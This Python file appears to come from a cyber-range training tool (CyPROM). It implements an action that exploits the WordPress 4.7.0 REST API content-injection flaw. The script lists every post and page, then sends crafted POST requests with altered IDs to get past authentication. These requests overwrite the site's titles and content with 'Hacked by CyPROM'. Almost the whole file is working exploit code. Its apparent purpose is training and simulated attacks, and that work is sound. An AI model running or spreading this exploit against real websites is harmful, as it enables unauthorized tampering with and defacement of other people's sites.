
#############################################################################
# "php_auth_bypass" action that does a custom PHP exploit on WordPress 4.7.0
#############################################################################

# Local constants
URL_PREFIX = "http://"
URL_SUFFIX_POSTS = "/wp-json/wp/v2/posts"
URL_SUFFIX_PAGES = "/wp-json/wp/v2/pages"

TITLE_KEY = "title"      # Based on HTML format, should not be changed
CONTENT_KEY = "content"  # Based on HTML format, should not be changed
DEFAULT_TITLE = "WordPress Was Hacked!"
DEFAULT_CONTENT = "Hacked by CyPROM"

HTTP_CONTENT_TYPE = {"Content-Type": "application/json"}
HTTP_SUCCESS_CODE = 200

COMMENT_SUCCESS = "PHP exploit succeeded"
COMMENT_FAILURE = "PHP exploit failed"

class php_auth_bypass:
        
	# Check action parameters
        def check(self,action):

                # Only optional parameters, so no checking done
		return True

	# Execute action
	def action(self, teamName, address, action, data):
		import json,requests

		posts = URL_PREFIX + address + URL_SUFFIX_POSTS
		pages = URL_PREFIX + address + URL_SUFFIX_PAGES

		if TITLE_KEY in action:
			title = action[TITLE_KEY]
		else:
			title = DEFAULT_TITLE

		if CONTENT_KEY in action:
			content = action[CONTENT_KEY]
		else:
			content = DEFAULT_CONTENT

		flag = False
		for url in [posts,pages]:
			response = requests.get(url)

			if response.status_code != HTTP_SUCCESS_CODE:
				continue

			info = json.loads(response.content)
			index = [p["id"] for p in info]

			for ID in index:
				dist = url+"/1?id="+str(ID)+"fg"
				header = HTTP_CONTENT_TYPE
				payload = {TITLE_KEY: title, CONTENT_KEY: content}

				attack = requests.post(dist,headers=header,data=json.dumps(payload))
				if attack.status_code == HTTP_SUCCESS_CODE:
					flag = True

		if flag:
			return True, COMMENT_SUCCESS, data
		else:
			return False, COMMENT_FAILURE, data
